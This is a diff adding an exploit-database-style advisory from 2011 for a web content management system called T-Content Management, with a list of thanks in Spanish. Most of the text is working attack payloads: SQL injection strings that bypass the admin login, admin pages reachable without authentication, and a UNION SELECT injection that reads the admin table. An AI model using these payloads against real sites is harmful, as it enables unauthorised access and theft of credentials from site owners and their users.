@@ -1,0 +1,42 @@
+# Exploit Title: T-Content Managment Multiple Vulnerability
+# Date: 06/02/2011
+# Author: Daniel Godoy
+# Author Mail: DanielGodoy[at]GobiernoFederal[dot]com
+# Author Web: www.delincuentedigital.com.ar
+# Software: http://www.telematica.com.ar/tcms.asp
+# http://www.telematica.com.ar/portfolio.asp
+# Tested on: Linux
+ 
+[Comment]
+Agradezco a mis amigos: Hernan Jais, Alfonso Cuevas, Lisandro
+Lezaeta, Nicolas Montanaro, Inyexion, Login-Root, KikoArg, Ricota,
+Xarnuz, Truenex, TsunamiBoom, _tty0, Big, Sunplace, Killerboy,Erick
+Jordan,Animacco ,
+yojota, Pablin77, SPEED, Knet, Cereal, Yago, Rash, MagnoBalt, El
+Rodrix, l0ve, NetT0xic,
+Gusan0r, Sabertrail, Maxi Soler. Darioxchx,r0dr1,Zer0-Zo0rg
+ 
+  
+[Authentication Bypass]
+
+http://path/admin/
+
+user: admin' or 1=1--
+pass: ' or 1=1--
+
+or
+
+user: admin
+pass: ' or 1=1--
+
+[Authentication Byppas 2]
+
+edit images :
+http://path/admin/galerias/admin_fotos.php?id_tipo=0&id_relacionado=0&nombre=Novedades
+edit content:
+http://path/admin/admin/novedades/inc_listado.php?orden=titulo
+
+[SQL Injection]
+
+http://path/notaevento.php?id_novedad=-1+UNION+SELECT+1,2,3,4+from+admin--
+
